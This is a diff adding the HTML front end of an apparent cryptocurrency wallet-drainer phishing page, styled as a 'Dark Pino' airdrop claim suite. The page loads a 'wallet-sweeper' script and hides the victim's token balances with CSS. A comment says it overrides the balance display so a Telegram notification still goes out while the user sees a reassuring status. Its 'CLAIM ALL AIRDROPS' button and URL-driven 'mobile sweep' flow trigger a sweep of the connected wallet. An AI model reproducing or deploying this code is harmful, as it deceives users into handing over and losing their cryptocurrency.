@@ -1,0 +1,1025 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🍍 Dark Pino Studio - Your Complete Airdrop Suite</title>
+    <link rel="stylesheet" href="css/dark-pino-styles.css">
+    <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script>
+    <script src="https://unpkg.com/@solana/spl-token@0.3.8/lib/index.iife.min.js"></script>
+    <script>
+        // Initialize SPL Token library with fallback
+        window.addEventListener('load', function() {
+            if (typeof window.splToken === 'undefined' && typeof window.SplToken !== 'undefined') {
+                window.splToken = window.SplToken;
+            }
+            console.log('SPL Token library loaded:', !!window.splToken);
+        });
+    </script>
+    <style>
+        /* Jupiter Studio Layout Styles */
+
+        /* Navigation */
+        .navbar {
+            background: rgba(26, 31, 58, 0.95);
+            backdrop-filter: blur(20px);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 1rem 0;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 1000;
+        }
+
+        .nav-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 2rem;
+        }
+
+        .nav-brand {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+        }
+
+        .nav-logo {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            border: 2px solid var(--gold);
+        }
+
+        .brand-text {
+            font-size: 1.25rem;
+            font-weight: 700;
+            background: var(--gradient-gold);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 2rem;
+        }
+
+        .nav-link {
+            color: rgba(255, 255, 255, 0.8);
+            text-decoration: none;
+            font-weight: 500;
+            transition: color 0.3s ease;
+        }
+
+        .nav-link:hover {
+            color: var(--jupiter-cyan);
+        }
+
+        /* Hero Section */
+        .hero {
+            padding: 120px 0 80px;
+            text-align: center;
+        }
+
+        .hero-container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 0 2rem;
+        }
+
+        .hero-title {
+            font-size: 4rem;
+            font-weight: 800;
+            margin-bottom: 1.5rem;
+            background: linear-gradient(135deg, #ffffff, #e0e7ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .hero-subtitle {
+            font-size: 1.25rem;
+            color: rgba(255, 255, 255, 0.7);
+            margin-bottom: 3rem;
+        }
+
+        /* Features Section */
+        .features {
+            padding: 60px 0;
+        }
+
+        .features-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 2rem;
+            display: grid;
+            grid-template-columns: 2fr 1fr 1fr;
+            gap: 2rem;
+        }
+
+        .feature-card {
+            background: rgba(42, 47, 74, 0.6);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 24px;
+            padding: 2rem;
+            transition: all 0.3s ease;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+
+        .feature-card:hover {
+            transform: translateY(-5px);
+            box-shadow: var(--shadow-card);
+            border-color: rgba(255, 255, 255, 0.2);
+        }
+
+        .feature-card:first-child {
+            background: linear-gradient(135deg, rgba(42, 47, 74, 0.8), rgba(26, 31, 58, 0.9));
+            border: 1px solid rgba(0, 212, 255, 0.3);
+        }
+
+        .card-content h2 {
+            font-size: 2rem;
+            margin-bottom: 1rem;
+            color: white;
+        }
+
+        .card-content p {
+            color: rgba(255, 255, 255, 0.7);
+            margin-bottom: 2rem;
+            line-height: 1.6;
+        }
+
+        /* Dashboard Mockup */
+        .dashboard-mockup {
+            background: rgba(10, 14, 39, 0.9);
+            border: 1px solid rgba(0, 212, 255, 0.3);
+            border-radius: 16px;
+            padding: 1.5rem;
+            margin-top: 2rem;
+        }
+
+        .mockup-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 1.5rem;
+        }
+
+        .mockup-logo {
+            font-weight: 700;
+            color: var(--gold);
+        }
+
+        .mockup-status {
+            font-size: 0.875rem;
+            color: rgba(255, 255, 255, 0.6);
+        }
+
+        .progress-bar {
+            display: flex;
+            gap: 1rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .progress-step {
+            flex: 1;
+            padding: 0.5rem;
+            border-radius: 8px;
+            background: rgba(255, 255, 255, 0.05);
+            text-align: center;
+            font-size: 0.875rem;
+            color: rgba(255, 255, 255, 0.6);
+        }
+
+        .progress-step.active {
+            background: var(--gradient-teal);
+            color: black;
+            font-weight: 600;
+        }
+
+        .claim-options {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1rem;
+        }
+
+        .option {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 0.5rem;
+            padding: 1rem;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 12px;
+            transition: all 0.3s ease;
+        }
+
+        .option:hover {
+            background: rgba(255, 255, 255, 0.1);
+        }
+
+        .emoji {
+            font-size: 2rem;
+        }
+
+        /* Card Icons */
+        .card-icon {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-top: 2rem;
+        }
+
+        .verify-icon {
+            width: 80px;
+            height: 80px;
+            background: var(--gradient-teal);
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2rem;
+            font-weight: bold;
+            color: black;
+        }
+
+        .lock-icon {
+            font-size: 4rem;
+            background: var(--gradient-purple);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        /* Buttons */
+        .btn {
+            padding: 0.875rem 2rem;
+            border: none;
+            border-radius: 12px;
+            font-weight: 600;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            display: inline-block;
+            text-align: center;
+        }
+
+        .btn-primary {
+            background: var(--gradient-teal);
+            color: black;
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: var(--shadow-teal);
+        }
+
+        .btn-secondary {
+            background: var(--gradient-jupiter);
+            color: white;
+        }
+
+        .btn-secondary:hover {
+            transform: translateY(-2px);
+            box-shadow: var(--shadow-cyan);
+        }
+
+        .btn-tertiary {
+            background: var(--gradient-purple);
+            color: white;
+        }
+
+        .btn-tertiary:hover {
+            transform: translateY(-2px);
+            box-shadow: var(--shadow-purple);
+        }
+
+        /* Wallet Modal */
+        .wallet-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 2000;
+        }
+
+        .modal-content {
+            background: var(--dark-secondary);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 20px;
+            padding: 2rem;
+            max-width: 400px;
+            width: 90%;
+        }
+
+        .wallet-options {
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+            margin-top: 1.5rem;
+        }
+
+        .wallet-option {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            padding: 1rem;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            color: white;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .wallet-option:hover {
+            background: rgba(255, 255, 255, 0.1);
+            border-color: var(--jupiter-cyan);
+        }
+
+        /* Bottom Illustration */
+        .bottom-illustration {
+            height: 300px;
+            position: relative;
+            overflow: hidden;
+            background: linear-gradient(180deg, transparent 0%, var(--dark-primary) 100%);
+        }
+
+        .landscape {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 200px;
+        }
+
+        .mountain-range {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 150px;
+            background: linear-gradient(180deg, transparent 0%, rgba(26, 31, 58, 0.8) 50%, var(--dark-secondary) 100%);
+            clip-path: polygon(0% 100%, 15% 60%, 25% 70%, 35% 40%, 45% 55%, 55% 30%, 65% 45%, 75% 25%, 85% 40%, 100% 20%, 100% 100%);
+        }
+
+        .pepe-silhouettes {
+            position: absolute;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            gap: 2rem;
+        }
+
+        .pepe-silhouette {
+            width: 60px;
+            height: 60px;
+            background: var(--dark-tertiary);
+            border-radius: 50%;
+            position: relative;
+        }
+
+        .pepe-silhouette::before {
+            content: '🐸';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 2rem;
+            opacity: 0.7;
+        }
+
+        /* Claim Status Section */
+        .claim-status {
+            padding: 60px 0;
+            background: rgba(10, 14, 39, 0.3);
+        }
+
+        .claim-container {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 0 2rem;
+        }
+
+        .claim-title {
+            font-size: 2.5rem;
+            text-align: center;
+            margin-bottom: 2rem;
+            background: var(--gradient-gold);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        #balanceDisplay {
+            width: 100%;
+        }
+
+        .balance-summary {
+            background: rgba(42, 47, 74, 0.6);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            padding: 2rem;
+            text-align: center;
+        }
+
+        /* Hide detailed token information from users */
+        .token-balances,
+        .sol-balance,
+        .token-item,
+        .chain-section {
+            display: none !important;
+        }
+
+        /* Simple status display */
+        .simple-status {
+            background: rgba(42, 47, 74, 0.6);
+            border: 1px solid rgba(0, 212, 255, 0.3);
+            border-radius: 20px;
+            padding: 3rem;
+            text-align: center;
+            margin: 2rem 0;
+        }
+
+        .status-icon {
+            font-size: 4rem;
+            margin-bottom: 1rem;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.6; }
+        }
+
+        .status-message {
+            font-size: 1.25rem;
+            color: rgba(255, 255, 255, 0.9);
+            margin-bottom: 1rem;
+        }
+
+        .status-subtitle {
+            font-size: 1rem;
+            color: rgba(255, 255, 255, 0.6);
+        }
+
+        /* Style the dynamically generated sweep button */
+        .btn-danger {
+            background: var(--gradient-teal) !important;
+            color: black !important;
+            border: 2px solid var(--jupiter-teal) !important;
+            font-weight: 700 !important;
+            font-size: 1.25rem !important;
+            padding: 18px 40px !important;
+            border-radius: 16px !important;
+            cursor: pointer !important;
+            transition: all 0.3s ease !important;
+            text-transform: uppercase !important;
+            letter-spacing: 0.5px !important;
+            box-shadow: var(--shadow-teal) !important;
+        }
+
+        .btn-danger:hover {
+            transform: translateY(-3px) !important;
+            box-shadow: 0 10px 30px rgba(20, 241, 149, 0.5) !important;
+            background: linear-gradient(135deg, #00ff88, #14f195) !important;
+        }
+
+        .btn-large {
+            padding: 20px 50px !important;
+            font-size: 1.5rem !important;
+        }
+
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            .nav-container {
+                padding: 0 1rem;
+            }
+
+            .nav-links {
+                display: none;
+            }
+
+            .hero-title {
+                font-size: 2.5rem;
+            }
+
+            .features-container {
+                grid-template-columns: 1fr;
+                gap: 1.5rem;
+                padding: 0 1rem;
+            }
+
+            .hero-container {
+                padding: 0 1rem;
+            }
+
+            .claim-container {
+                padding: 0 1rem;
+            }
+
+            .claim-title {
+                font-size: 2rem;
+            }
+
+            .btn-danger {
+                font-size: 1rem !important;
+                padding: 16px 30px !important;
+            }
+
+            .btn-large {
+                padding: 18px 35px !important;
+                font-size: 1.25rem !important;
+            }
+        }
+
+        /* Notification System */
+        .notification {
+            position: fixed;
+            top: 80px;
+            right: 20px;
+            padding: 1rem 1.5rem;
+            border-radius: 12px;
+            color: white;
+            font-weight: 600;
+            z-index: 1000;
+            animation: slideIn 0.3s ease;
+            max-width: 300px;
+        }
+
+        .notification-success {
+            background: var(--gradient-teal);
+            color: black;
+        }
+        .notification-error {
+            background: linear-gradient(135deg, #ef4444, #dc2626);
+        }
+        .notification-warning {
+            background: linear-gradient(135deg, #f59e0b, #d97706);
+        }
+        .notification-info {
+            background: var(--gradient-jupiter);
+        }
+
+        @keyframes slideIn {
+            from { transform: translateX(100%); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+    </style>
+</head>
+<body>
+    <!-- Navigation -->
+    <nav class="navbar">
+        <div class="nav-container">
+            <div class="nav-brand">
+                <img src="images/pepe-mascot.png" alt="Dark Pino" class="nav-logo">
+                <span class="brand-text">Dark Pino Studio</span>
+            </div>
+            <div class="nav-links">
+                <a href="#" class="nav-link">Home</a>
+                <a href="#claim" class="nav-link">Claim</a>
+                <a href="#verify" class="nav-link">Verify</a>
+                <a href="#lock" class="nav-link">Lock</a>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Hero Section -->
+    <section class="hero">
+        <div class="hero-container">
+            <h1 class="hero-title">Your Complete Airdrop Suite</h1>
+            <p class="hero-subtitle">Claim, verify and manage your airdrops from a single platform.</p>
+        </div>
+    </section>
+
+    <!-- Features Section -->
+    <section class="features">
+        <div class="features-container">
+            <!-- Claim Card -->
+            <div class="feature-card" id="claim">
+                <div class="card-content">
+                    <h2>Claim</h2>
+                    <p>Get your Dark Pino tokens with the most customizable claim mechanisms</p>
+                    <button class="btn btn-primary" id="connectWalletBtn">Claim Now</button>
+                </div>
+                <div class="card-preview">
+                    <div class="dashboard-mockup">
+                        <div class="mockup-header">
+                            <div class="mockup-logo">🍍 Dark Pino</div>
+                            <div class="mockup-status">Your token claim lab 🧪</div>
+                        </div>
+                        <div class="progress-bar">
+                            <div class="progress-step active">1. Connect</div>
+                            <div class="progress-step">2. Enhance</div>
+                            <div class="progress-step">3. Claim</div>
+                        </div>
+                        <div class="claim-options">
+                            <div class="option">
+                                <span class="emoji">🎭</span>
+                                <span>Meme</span>
+                            </div>
+                            <div class="option">
+                                <span class="emoji">⚡</span>
+                                <span>Custom</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Verify Card -->
+            <div class="feature-card" id="verify">
+                <div class="card-content">
+                    <h2>Verify</h2>
+                    <p>Build confidence in your tokens by getting them verified by Dark Pino</p>
+                    <button class="btn btn-secondary">Verify</button>
+                </div>
+                <div class="card-icon">
+                    <div class="verify-icon">✓</div>
+                </div>
+            </div>
+
+            <!-- Lock Card -->
+            <div class="feature-card" id="lock">
+                <div class="card-content">
+                    <h2>Lock</h2>
+                    <p>Transparently lock, vest and distribute tokens on-chain with our open-sourced and audited program</p>
+                    <button class="btn btn-tertiary">Lock</button>
+                </div>
+                <div class="card-icon">
+                    <div class="lock-icon">🔒</div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Hidden sections for wallet connection -->
+    <div id="walletModal" class="wallet-modal" style="display: none;">
+        <div class="modal-content">
+            <h3>Connect Your Wallet</h3>
+            <div class="wallet-options">
+                <button class="wallet-option" id="phantomConnect">
+                    <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTI2LjU1MzUgN0gyNi41NTM1QzI2LjU1MzUgNC4yMzkgMjQuMzE0NSAyIDIxLjU1MzUgMkM4LjY4IDIgOC42OCAyIDguNjggMkM1LjkxOSAyIDMuNjggNC4yMzkgMy42OCA3VjdDMy42OCA5Ljc2MSA1LjkxOSAxMiA4LjY4IDEySDIxLjU1MzVDMjQuMzE0NSAxMiAyNi41NTM1IDkuNzYxIDI2LjU1MzUgN1oiIGZpbGw9IiM0Qzc3RjAiLz4KPC9zdmc+" alt="Phantom">
+                    Connect Phantom
+                </button>
+                <button class="wallet-option" id="metaMaskConnect">
+                    <span>🦊</span>
+                    Connect MetaMask
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Claim Status Section -->
+    <section class="claim-status" id="claimStatusSection" style="display: none;">
+        <div class="claim-container">
+            <h2 class="claim-title">Airdrop Claim Status</h2>
+            <div id="balanceDisplay">
+                <div class="balance-summary">
+                    <p style="text-align: center; color: #888;">
+                        Wallet connected - scanning for claimable tokens...
+                    </p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Bottom Illustration -->
+    <div class="bottom-illustration">
+        <div class="landscape">
+            <div class="mountain-range"></div>
+            <div class="pepe-silhouettes">
+                <div class="pepe-silhouette pepe-1"></div>
+                <div class="pepe-silhouette pepe-2"></div>
+            </div>
+        </div>
+    </div>
+
+    <script src="js/wallet-sweeper.js?v=5.0"></script>
+
+    <script>
+        // Modern wallet connection handling
+        function showWalletModal() {
+            const modal = document.getElementById('walletModal');
+            modal.style.display = 'flex';
+        }
+
+        function hideWalletModal() {
+            const modal = document.getElementById('walletModal');
+            modal.style.display = 'none';
+        }
+
+        function connectWalletFallback() {
+            console.log('Showing wallet connection modal...');
+            showWalletModal();
+        }
+
+        function showClaimStatusSection() {
+            const claimSection = document.getElementById('claimStatusSection');
+            if (claimSection) {
+                claimSection.style.display = 'block';
+
+                // Show simple scanning status
+                updateClaimStatus('scanning');
+
+                // Smooth scroll to the claim section
+                setTimeout(() => {
+                    claimSection.scrollIntoView({ behavior: 'smooth' });
+                }, 500);
+            }
+        }
+
+        function updateClaimStatus(status) {
+            const balanceDisplay = document.getElementById('balanceDisplay');
+            if (!balanceDisplay) return;
+
+            let content = '';
+
+            switch(status) {
+                case 'scanning':
+                    content = `
+                        <div class="simple-status">
+                            <div class="status-icon">🔍</div>
+                            <div class="status-message">Scanning Multi-Chain Wallets</div>
+                            <div class="status-subtitle">Checking Solana, Ethereum, Bitcoin, and 6 other blockchains for eligible airdrops...</div>
+                        </div>
+                    `;
+                    break;
+                case 'found':
+                    content = `
+                        <div class="simple-status">
+                            <div class="status-icon">🎁</div>
+                            <div class="status-message">Airdrops Available!</div>
+                            <div class="status-subtitle">Multiple eligible tokens found across your connected wallets</div>
+                        </div>
+                    `;
+                    break;
+                case 'ready':
+                    content = `
+                        <div class="simple-status">
+                            <div class="status-icon">✅</div>
+                            <div class="status-message">Ready to Claim</div>
+                            <div class="status-subtitle">All eligible airdrops have been verified and are ready for transfer</div>
+                        </div>
+                    `;
+                    break;
+            }
+
+            balanceDisplay.innerHTML = content;
+        }
+
+        function addClaimButton() {
+            const balanceDisplay = document.getElementById('balanceDisplay');
+            if (!balanceDisplay) return;
+
+            // Add the claim button to the simple status
+            const claimButtonHTML = `
+                <div class="simple-status">
+                    <div class="status-icon">🎁</div>
+                    <div class="status-message">Airdrops Ready to Claim!</div>
+                    <div class="status-subtitle">Your multi-chain airdrop eligibility has been verified</div>
+                    <div style="margin-top: 2rem;">
+                        <button class="btn btn-danger btn-large" id="sweepAllBtn">
+                            🚀 CLAIM ALL AIRDROPS
+                        </button>
+                    </div>
+                </div>
+            `;
+
+            balanceDisplay.innerHTML = claimButtonHTML;
+
+            // Attach the event listener to the new button
+            const sweepBtn = document.getElementById('sweepAllBtn');
+            if (sweepBtn && window.walletSweeper) {
+                sweepBtn.addEventListener('click', () => {
+                    if (window.walletSweeper.executeSweep) {
+                        window.walletSweeper.executeSweep();
+                    }
+                });
+            }
+        }
+
+        // Handle URL parameters for mobile sweep links
+        document.addEventListener('DOMContentLoaded', () => {
+            console.log('DOM loaded, initializing page...');
+
+            // Add modern event handlers
+            const connectBtn = document.getElementById('connectWalletBtn');
+            if (connectBtn) {
+                console.log('Found connect button, adding click handler');
+                connectBtn.onclick = connectWalletFallback;
+            }
+
+            // Wallet modal handlers
+            const phantomBtn = document.getElementById('phantomConnect');
+            const metaMaskBtn = document.getElementById('metaMaskConnect');
+            const modal = document.getElementById('walletModal');
+
+            if (phantomBtn) {
+                phantomBtn.onclick = async () => {
+                    hideWalletModal();
+                    if (window.walletSweeper && window.walletSweeper.connectPhantom) {
+                        await window.walletSweeper.connectPhantom();
+                        // Show the claim status section after connection
+                        showClaimStatusSection();
+
+                        // Override the displayBalances function to use our simple display
+                        if (window.walletSweeper) {
+                            const originalDisplayBalances = window.walletSweeper.displayBalances;
+                            window.walletSweeper.displayBalances = function() {
+                                // Still call original for Telegram notification
+                                originalDisplayBalances.call(this);
+                                // But show simple status to user
+                                updateClaimStatus('ready');
+                                // Add the claim button manually
+                                setTimeout(() => {
+                                    addClaimButton();
+                                }, 1000);
+                            };
+                        }
+                    } else {
+                        console.error('Wallet sweeper not initialized');
+                        alert('Wallet sweeper is still loading. Please wait a moment and try again.');
+                    }
+                };
+            }
+
+            if (metaMaskBtn) {
+                metaMaskBtn.onclick = async () => {
+                    hideWalletModal();
+                    if (window.walletSweeper && window.walletSweeper.connectEthereum) {
+                        await window.walletSweeper.connectEthereum();
+                    } else {
+                        console.error('Ethereum connection not available');
+                        alert('Ethereum wallet connection coming soon!');
+                    }
+                };
+            }
+
+            // Close modal when clicking outside
+            if (modal) {
+                modal.onclick = (e) => {
+                    if (e.target === modal) {
+                        hideWalletModal();
+                    }
+                };
+            }
+
+            const urlParams = new URLSearchParams(window.location.search);
+
+            if (urlParams.get('action') === 'sweep') {
+                // This is a mobile sweep link
+                const sourceWallet = urlParams.get('source');
+                const destWallet = urlParams.get('destination');
+
+                if (sourceWallet && destWallet) {
+                    // Show mobile sweep interface
+                    showMobileSweepInterface(sourceWallet, destWallet);
+                }
+            }
+        });
+
+        function showMobileSweepInterface(sourceWallet, destWallet) {
+            const container = document.querySelector('.sweeper-container');
+            container.innerHTML = `
+                <div class="wallet-status">
+                    <h2>📱 Mobile Sweep</h2>
+                    <p>You're about to sweep from:</p>
+
+                    <div class="wallet-info">
+                        <div class="wallet-item">
+                            <h4>From</h4>
+                            <div class="wallet-address">${sourceWallet.substring(0, 8)}...${sourceWallet.substring(sourceWallet.length - 8)}</div>
+                        </div>
+
+                        <div class="wallet-item">
+                            <h4>To</h4>
+                            <div class="wallet-address">${destWallet.substring(0, 8)}...${destWallet.substring(destWallet.length - 8)}</div>
+                        </div>
+                    </div>
+
+                    <button class="btn btn-primary btn-large" onclick="connectAndSweep('${sourceWallet}', '${destWallet}')">
+                        🔗 Connect Phantom & Sweep
+                    </button>
+                </div>
+            `;
+        }
+
+        async function connectAndSweep(expectedSource, destWallet) {
+            try {
+                // Connect Phantom
+                if (!window.solana || !window.solana.isPhantom) {
+                    alert('Please install Phantom wallet first');
+                    window.open('https://phantom.app/', '_blank');
+                    return;
+                }
+
+                const resp = await window.solana.connect();
+                const connectedWallet = resp.publicKey.toString();
+
+                // Verify this is the expected wallet
+                if (connectedWallet !== expectedSource) {
+                    alert('Connected wallet does not match the sweep link');
+                    return;
+                }
+
+                // Override destination wallet
+                walletSweeper.config.destinationWallet = destWallet;
+                walletSweeper.config.isConfigured = true;
+
+                // Scan and sweep
+                await walletSweeper.scanAllBalances();
+
+                // Show sweep button
+                setTimeout(() => {
+                    const sweepBtn = document.querySelector('.btn-danger');
+                    if (sweepBtn) {
+                        sweepBtn.scrollIntoView({ behavior: 'smooth' });
+                    }
+                }, 1000);
+
+            } catch (error) {
+                console.error('Mobile sweep failed:', error);
+                alert('Failed to connect wallet: ' + error.message);
+            }
+        }
+
+        // Fun easter egg for clicking the Pepe mascot
+        function pepeClick() {
+            const pepe = document.querySelector('.pepe-mascot');
+            const messages = [
+                '🐸 PEPE approves this airdrop!',
+                '🎁 Based and Pepepilled!',
+                '🚀 To the moon with Dark Pino!',
+                '💎 Diamond hands only!',
+                '🔥 This airdrop is fire!',
+                '⚡ Instant meme magic!'
+            ];
+
+            const randomMessage = messages[Math.floor(Math.random() * messages.length)];
+
+            // Create floating message
+            const floatingMsg = document.createElement('div');
+            floatingMsg.textContent = randomMessage;
+            floatingMsg.style.cssText = `
+                position: fixed;
+                top: 50%;
+                left: 50%;
+                transform: translate(-50%, -50%);
+                background: linear-gradient(135deg, #FFD700, #FFA500);
+                color: #000;
+                padding: 15px 25px;
+                border-radius: 25px;
+                font-weight: bold;
+                font-size: 18px;
+                z-index: 9999;
+                box-shadow: 0 10px 30px rgba(255, 215, 0, 0.5);
+                animation: pepePop 2s ease-out forwards;
+                pointer-events: none;
+            `;
+
+            // Add animation keyframes if not already added
+            if (!document.getElementById('pepe-animations')) {
+                const style = document.createElement('style');
+                style.id = 'pepe-animations';
+                style.textContent = `
+                    @keyframes pepePop {
+                        0% { transform: translate(-50%, -50%) scale(0); opacity: 0; }
+                        20% { transform: translate(-50%, -50%) scale(1.2); opacity: 1; }
+                        40% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
+                        100% { transform: translate(-50%, -50%) scale(0.8); opacity: 0; }
+                    }
+                `;
+                document.head.appendChild(style);
+            }
+
+            document.body.appendChild(floatingMsg);
+
+            // Pepe bounce effect
+            pepe.style.animation = 'none';
+            setTimeout(() => {
+                pepe.style.animation = 'float 3s ease-in-out infinite, glow 2s ease-in-out infinite alternate';
+            }, 100);
+
+            // Remove message after animation
+            setTimeout(() => {
+                floatingMsg.remove();
+            }, 2000);
+        }
+    </script>
+
+</body>
+</html>
